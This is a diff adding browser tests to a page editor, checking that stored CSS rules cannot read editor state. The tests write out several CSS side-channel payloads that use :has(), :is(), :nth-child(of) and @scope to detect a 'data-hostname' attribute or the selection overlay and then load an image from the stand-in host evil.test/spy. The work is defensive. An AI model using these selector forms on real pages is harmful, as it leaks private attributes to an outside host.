@@ -309,6 +309,176 @@ describe('stored rules on the mounted editor', () => {
     });
   });
 
+  // The same stored page reads the document it is in. On a published page that is the
+  // page itself, which is the control: each form really reports there. In the editor it
+  // would read the signed-in document, so it must have one result whatever that holds.
+  describe('a stored page cannot read the editor', () => {
+    const SPY = 'https://evil.test/spy';
+    const hidden = { ...BOX, display: 'none', backgroundImage: `url(${SPY})` };
+    const shown = { display: 'block' };
+    const FORMS: Record<string, Partial<Rule>> = {
+      ':is() reaching html': { selector: '&:is(html:has([data-hostname]) *)' },
+      'a substring of an attribute': { selector: '&:is(html:has([data-hostname*="geh"]) *)' },
+      ':not() around it': { selector: '&:not(:is(html:not(:has([data-hostname])) *))' },
+      ':where() and :not() nested': { selector: '&:where(:not(:is(html:not(:has([data-hostname])) *)))' },
+      ':nth-child(of)': { selector: '&:nth-child(n of :is(html:has([data-hostname]) *))' },
+      'a bare complex selector': { selector: '&:is(html[data-hostname] *)' },
+      'a :has() around it': { selector: '&:has(:is(html[data-hostname] div))' },
+      '@scope with :has()': { selector: '&', at: ['@scope (html:has([data-hostname*="geh"]))'] },
+      '@scope with a compound root': { selector: '&', at: ['@scope (html[data-hostname*="geh"])'] },
+    };
+    const treeOf = (form: Partial<Rule>) => pageOf(node('a', { style: hidden, rules: [{ id: 'r', style: shown, ...form }] }, node('kid', {})));
+
+    const spying = (page: Page): string[] => {
+      const seen: string[] = [];
+      page.on('request', (request) => {
+        if (request.url().startsWith('https://evil.test')) seen.push(request.url());
+      });
+      return seen;
+    };
+    /** What the review's `data-hostname` stands for: an attribute the editor renders, on an element and on the root. */
+    const hostname = (page: Page) =>
+      page.evaluate(() => {
+        document.documentElement.setAttribute('data-hostname', 'geheim.example');
+        const element = document.createElement('i');
+        element.id = 'editor-state';
+        element.setAttribute('data-hostname', 'geheim.example');
+        document.body.append(element);
+      });
+    const noHostname = (page: Page) =>
+      page.evaluate(() => {
+        document.documentElement.removeAttribute('data-hostname');
+        document.getElementById('editor-state')?.remove();
+      });
+    /** A form written around a negation is constantly on rather than constantly off: what counts is that it is constant. */
+    const ALWAYS_ON = new Set([':not() around it', ':where() and :not() nested']);
+
+    it.each(Object.keys(FORMS))('%s: reports on a published page, the control', async (name) => {
+      const page = await browser.newPage();
+      await page.route('**/*', (route) => route.fulfill({ status: 200, body: '' }));
+      const seen = spying(page);
+      await page.setContent(publishedDocument(renderPublished(treeOf(FORMS[name]))));
+      await hostname(page);
+      await expect.poll(() => seen.length, { timeout: 2000 }).toBeGreaterThan(0);
+      await page.close();
+    });
+
+    it.each(Object.keys(FORMS))('%s: one result on the canvas whatever the editor holds, previewed or not', async (name) => {
+      const page = await mounted(treeOf(FORMS[name]));
+      const seen = spying(page);
+      const resting = ALWAYS_ON.has(name) ? 'block' : 'none';
+      expect(await computed(page, 'a', 'display')).toBe(resting);
+      await hostname(page);
+      await click(page, 'page');
+      await page.waitForTimeout(150);
+      expect(await computed(page, 'a', 'display')).toBe(resting);
+      expect(seen).toEqual([]);
+      const previewing = ALWAYS_ON.has(name) ? 'none' : 'block';
+      await preview(page, 'a', 'r');
+      expect(await computed(page, 'a', 'display')).toBe(previewing);
+      await noHostname(page);
+      expect(await computed(page, 'a', 'display')).toBe(previewing);
+      await page.close();
+    });
+
+    it.each(Object.keys(FORMS))('%s: one result on the preview whatever the editor holds', async (name) => {
+      const { page, crashes } = await openEditor(browser, bundle);
+      await placeTree(page, crashes, treeOf(FORMS[name]));
+      const seen = spying(page);
+      await hostname(page);
+      await page.evaluate(() => (window as unknown as { __editor: EditorHooks }).__editor.setPreviewOpen(true));
+      const frame = page.locator('[data-preview-frame]');
+      await frame.waitFor({ state: 'visible' });
+      await page.waitForTimeout(150);
+      const target = frame.locator('[data-inner-component-id="a"]');
+      const resting = ALWAYS_ON.has(name) ? 'block' : 'none';
+      expect(await target.evaluate((el) => getComputedStyle(el).display)).toBe(resting);
+      await noHostname(page);
+      expect(await target.evaluate((el) => getComputedStyle(el).display)).toBe(resting);
+      if (!ALWAYS_ON.has(name)) expect(seen).toEqual([]);
+      await page.close();
+    });
+
+    it('a selection in the editor tells a stored page nothing', async () => {
+      const selector = '&:is(html:has([data-testid="primary-selection-overlay"]:not([style*="none"])) *)';
+      const page = await mounted(pageOf(node('a', { style: hidden, rules: [{ id: 'r', selector, style: shown }] }), node('b', { style: BOX })));
+      const seen = spying(page);
+      await click(page, 'b');
+      expect(await hook(page, 'selectedId')).toBe('b');
+      await page.waitForTimeout(150);
+      expect(seen).toEqual([]);
+      await page.close();
+    });
+
+    it('the top bar opening the preview tells a stored page nothing', async () => {
+      const { page, crashes } = await openEditor(browser, bundle);
+      await placeTree(page, crashes, pageOf(node('a', { style: hidden, rules: [{ id: 'r', selector: '&:is(html:has([data-editor-topbar]) *)', style: shown }] })));
+      const seen = spying(page);
+      await page.evaluate(() => (window as unknown as { __editor: EditorHooks }).__editor.setPreviewOpen(true));
+      await page.locator('[data-preview-frame]').waitFor({ state: 'visible' });
+      await page.waitForTimeout(150);
+      expect(seen).toEqual([]);
+      await page.close();
+    });
+
+    it('a rule cannot reach an external address through var(), with a site path as the control', async () => {
+      const page = await mounted(
+        pageOf(
+          node('a', { style: { ...BOX, '--x': `url(${SPY})` }, rules: [{ id: 'r', selector: '&', style: { backgroundImage: 'var(--x)' } }] }),
+          node('b', { style: { ...BOX, '--y': 'url(/site.png)' }, rules: [{ id: 'r', selector: '&', style: { backgroundImage: 'var(--y)' } }] }),
+        ),
+      );
+      expect(await computed(page, 'a', 'background-image')).toBe('none');
+      expect(await computed(page, 'b', 'background-image')).toContain('/site.png');
+      await page.close();
+    });
+
+    it('keeps the specificity of what it stands for, live and dead', async () => {
+      const OTHER = 'rgb(0, 9, 0)';
+      const first: Rule = { id: 'first', selector: '&:first-child', style: { color: OTHER } };
+      const page = await mounted(
+        pageOf(
+          node('w', {}, node('a', { style: { ...BOX, color: NORMAL }, rules: [{ id: 'is', selector: '&:is(.x .y)', style: { color: RULE } }, first] })),
+          node('v', {}, node('b', { style: { ...BOX, color: NORMAL }, rules: [first, { id: 'where', selector: '&:where(.x .y)', style: { color: RULE } }] })),
+        ),
+      );
+      // (0,2,0) beats :first-child although it comes first, as it would when matched.
+      await preview(page, 'a', 'is');
+      expect(await computed(page, 'a', 'color')).toBe(RULE);
+      // :where() counts for nothing, so :first-child wins although it comes first.
+      await preview(page, 'b', 'where');
+      expect(await computed(page, 'b', 'color')).toBe(OTHER);
+      await page.close();
+    });
+
+    // E5 of the review: 32 nodes with 64 rules each took a click from 65 ms to 300.
+    it('a costly condition does not slow a click', async () => {
+      const heavy = (index: number) => `&:is(html:has(div div div div div div div div [data-h${index}]) *)`;
+      const costly = Array.from({ length: 32 }, (_, n) =>
+        node(`c${n}`, { style: { ...BOX, height: '4px' }, rules: Array.from({ length: 64 }, (_, r) => ({ id: `r${r}`, selector: heavy(r + n * 64), style: { color: RULE } })) }),
+      );
+      const plain = Array.from({ length: 32 }, (_, n) => node(`c${n}`, { style: { ...BOX, height: '4px' } }));
+      const clickTime = async (children: ComponentNode[]): Promise<number> => {
+        const page = await mounted(pageOf(...children));
+        const { x, y } = await centre(page, 'c3');
+        const times: number[] = [];
+        for (let i = 0; i < 9; i++) {
+          const start = Date.now();
+          await page.mouse.click(x, y);
+          await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(() => setTimeout(resolve, 0))));
+          times.push(Date.now() - start);
+          await page.keyboard.press('Escape');
+        }
+        await page.close();
+        return times.sort((a, b) => a - b)[4];
+      };
+      const without = await clickTime(plain);
+      const withRules = await clickTime(costly);
+      process.stderr.write(`E5 click: ${withRules} ms with 2048 costly rules, ${without} ms without\n`);
+      expect(withRules).toBeLessThan(without + 100);
+    });
+  });
+
   it('previews a hover preset without letting it beat an inline value', async () => {
     const page = await mounted(
       pageOf(
